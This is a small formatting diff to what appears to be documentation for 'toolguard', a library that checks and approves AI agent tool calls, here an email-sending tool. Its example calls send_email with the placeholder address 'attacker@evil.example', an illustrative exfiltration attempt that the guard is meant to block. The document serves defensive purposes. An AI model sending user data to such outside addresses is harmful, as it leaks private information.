@@ -231,8 +231,10 @@ from toolguard import ConsoleApprover, Guard, Policy, ToolBlocked
 guard = Guard(Policy.load("balanced"), session="run-42", approver=ConsoleApprover())
 guard.observe_user(user_prompt)
 
-@guard.wrap("mcp__mail__send_email")      # checks before, records the result after
+
+@guard.wrap("mcp__mail__send_email")  # checks before, records the result after
 def send_email(to, body): ...
+
 
 try:
     send_email("attacker@evil.example", "...")
